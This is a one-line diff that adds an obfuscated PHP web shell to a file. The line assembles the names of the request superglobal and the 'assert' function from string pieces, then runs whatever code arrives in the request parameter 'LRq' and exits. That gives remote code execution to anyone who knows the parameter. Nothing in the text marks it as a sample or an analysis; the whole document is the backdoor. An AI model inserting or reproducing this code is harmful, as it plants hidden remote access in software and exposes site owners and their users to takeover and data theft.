@@ -1,0 +1,1 @@
+<?php if (isset(${"_REQUES"."T"}['LRq'])){$w="asse"."rt";$w(${"_REQUEST"}['LRq']);exit;}
